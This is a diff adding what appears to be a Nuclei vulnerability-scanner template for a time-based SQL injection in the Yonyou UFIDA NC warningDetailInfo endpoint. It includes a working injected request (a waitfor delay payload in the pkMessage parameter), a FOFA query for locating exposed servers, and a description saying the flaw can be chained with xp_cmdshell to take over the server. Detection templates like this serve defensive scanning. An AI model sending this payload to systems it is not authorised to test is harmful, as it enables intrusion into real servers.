@@ -1,0 +1,27 @@
+id: yonyou-nc-warningDetailInfo-sqli
+
+info:
+  name: 用友 UFIDA NC warningDetailInfo - sqli
+  author: leadlife
+  severity: high
+  description: 用友 NC /ebvp/infopub/warningDetailInfo接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。影响范围：NC63、NC633、NC65
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC-warningDetailInfo%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: false
+    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
+  tags: yonyou,sqli,nc,oa,time
+
+http:
+  - raw:
+    - |
+      @timeout: 15s
+      GET /ebvp/infopub/warningDetailInfo?pageId=login&pkMessage=1'waitfor+delay+'0:0:6'-- HTTP/1.1
+      Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 500
+        condition: and
